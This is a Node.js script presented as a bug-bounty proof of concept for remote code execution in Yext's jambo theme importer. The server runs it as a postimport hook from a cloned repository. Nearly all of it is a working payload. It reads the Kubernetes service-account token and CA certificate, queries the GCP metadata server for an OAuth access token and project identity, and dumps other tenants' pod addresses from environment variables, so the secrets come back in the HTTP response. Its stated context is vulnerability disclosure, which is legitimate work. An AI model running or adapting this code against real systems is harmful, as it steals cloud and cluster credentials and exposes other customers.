#!/usr/bin/env node
/**
 * Yext bug-bounty PoC — Sites Code Editor (sitesgit) RCE evidence collector.
 *
 * Executed server-side by jambo:
 *   jambo import --themeUrl https://github.com/<you>/<this-repo>.git
 *     -> ThemeImporter.import()  git-clones this repo
 *     -> ThemeImporter._postImport()  finds 'postimport.*' in the clone
 *     -> CustomCommandExecuter.execute()
 *          spawnSync(exe, args, { cwd, shell: true, stdio: 'inherit' })
 *
 * Because stdio is 'inherit', everything printed here is returned in the
 * HTTP response of the /jambo/import call.
 *
 * READ-ONLY. Collects identity + the credentials reachable from the container.
 * No credential is used to authenticate to any service.
 */
'use strict';
const { execSync } = require('child_process');
const fs = require('fs');

const SA = '/var/run/secrets/kubernetes.io/serviceaccount';
const MD = 'http://169.254.169.254/computeMetadata/v1';

function sh(cmd) {
  try {
    return execSync(cmd, { encoding: 'utf8', timeout: 15000, stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (e) {
    return '[error] ' + (e.stdout || '') + (e.stderr || e.message || '');
  }
}
function readFile(p) {
  try { return fs.readFileSync(p, 'utf8'); } catch (e) { return '[unreadable] ' + e.message; }
}
function meta(path) {
  return sh("curl -s --max-time 10 -H 'Metadata-Flavor: Google' " + MD + path);
}
function hr(t) { console.log('\n' + '#'.repeat(78) + '\n# ' + t + '\n' + '#'.repeat(78)); }

/* ------------------------------------------------------------------ */
hr('SECTION 1 - whoami / id');
process.stdout.write(sh('whoami'));
process.stdout.write(sh('id'));

/* ------------------------------------------------------------------ */
hr('SECTION 2 - ls -la');
console.log('--- cwd: ' + process.cwd() + ' ---');
process.stdout.write(sh('ls -la'));
console.log('--- ' + SA + ' ---');
process.stdout.write(sh('ls -la ' + SA + '/'));

/* ------------------------------------------------------------------ */
hr('SECTION 3 - FULL CONTENT OF REACHABLE CREDENTIALS / IDENTITY');

console.log('\n[3.1] HOST / POD');
process.stdout.write(sh('hostname'));
process.stdout.write(sh('uname -a'));
console.log('cwd  : ' + process.cwd());
console.log('node : ' + process.version);
process.stdout.write(sh('date -u'));

console.log('\n[3.2] KUBERNETES SERVICE-ACCOUNT TOKEN  (' + SA + '/token)');
console.log(readFile(SA + '/token'));

console.log('\n[3.3] KUBERNETES ca.crt  (' + SA + '/ca.crt)');
console.log(readFile(SA + '/ca.crt'));

console.log('\n[3.4] KUBERNETES NAMESPACE');
console.log(readFile(SA + '/namespace'));

console.log('\n[3.5] GCP METADATA - OAuth ACCESS TOKEN');
console.log(meta('/instance/service-accounts/default/token'));

console.log('\n[3.6] GCP TOKEN SCOPES');
console.log(meta('/instance/service-accounts/default/scopes'));

console.log('\n[3.7] GCP SERVICE ACCOUNT IDENTITY');
console.log(meta('/instance/service-accounts/default/email'));

console.log('\n[3.8] GCP PROJECT (project-id / numeric-project-id)');
console.log(meta('/project/project-id'));
console.log(meta('/project/numeric-project-id'));

console.log('\n[3.9] GCP ZONE');
console.log(meta('/instance/zone'));

console.log('\n[3.10] CROSS-TENANT - peer live-preview pod service addresses');
const peers = Object.keys(process.env)
  .filter(k => k.startsWith('LIVE_PREVIEW_'))
  .sort()
  .map(k => k + '=' + process.env[k]);
console.log(peers.join('\n'));
const ids = [...new Set(Object.keys(process.env)
  .map(k => (k.match(/^LIVE_PREVIEW_([0-9A-F]{8})_/) || [])[1])
  .filter(Boolean))].sort();
console.log('\ndistinct peer pod ids: ' + ids.length + ' -> ' + ids.join(', '));

hr('END OF POC OUTPUT');
